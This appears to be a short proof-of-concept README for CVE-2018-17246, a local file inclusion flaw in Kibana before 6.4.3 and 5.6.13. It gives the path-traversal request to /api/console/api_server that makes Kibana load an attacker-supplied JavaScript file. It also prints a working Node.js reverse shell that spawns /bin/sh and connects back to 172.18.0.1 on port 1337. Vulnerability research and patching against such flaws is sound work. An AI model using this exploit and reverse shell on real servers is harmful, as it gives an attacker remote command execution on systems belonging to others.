# CVE-2018-17246 - Kibana LFI < 6.4.3 & 5.6.13

A Local File Inclusion on Kibana found by [CyberArk Labs](https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/), the LFI can be use to execute a reverse shell on the Kibana server with the following payload:
```
/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../path/to/shell.js
```
As you already guessed, this attack need to be paired with an unrestricted file upload or any other vulnerability that allows you to write a file on the server.

> There is no input validation so we can change the name of the JavaScript file to anything we want. In this case, with the path traversal technique, we can choose any file on the Kibana server.
> One thing to be aware of, however, is node's [module caching](https://nodejs.org/api/modules.html#modules_caching) feature. Essentially, since the LFI works by sending unsanitized user input to node's `require` function, the included module (the attacker's payload) will be cached _by filename_. This means that you cannot send the same payload to, e.g., recover a reverse shell.

![lfi](https://user-images.githubusercontent.com/5891788/54027009-3ddd5900-41a0-11e9-9f17-52b9fc0087bd.png)

**Vulnerability details**: https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/

**Security Advisory**: https://www.elastic.co/blog/kibana-local-file-inclusion-flaw-cve-2018-17246

---

* kibana version 6.0.0 from docker (without any ElasticSearch linked the PoC is  working)
* shell.js from https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(1337, "172.18.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

